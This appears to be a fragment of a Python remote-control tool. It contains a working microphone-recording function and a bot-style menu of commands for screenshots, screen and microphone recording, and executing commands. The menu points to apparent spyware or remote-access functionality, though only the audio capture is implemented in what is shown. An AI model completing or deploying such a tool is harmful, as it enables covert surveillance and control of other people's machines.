import pyaudio
import pyautogui
import wave
import subprocess
# import os



def record(time=6):
    filename = "recorded.wav"

    chunk = 1024
    FORMAT = pyaudio.paInt16
    channels = 1
    sample_rate = 44100

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    frames = []
    for i in range(int(44100 / chunk * time)):
        data = stream.read(chunk)
        frames.append(data)
        
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)
    wf.writeframes(b"".join(frames))
    wf.close()


cmd = """
Commands:
-| /start

-| /screenshot

-| /execute_command

-| /micro_recording

-| /screen_recording

"""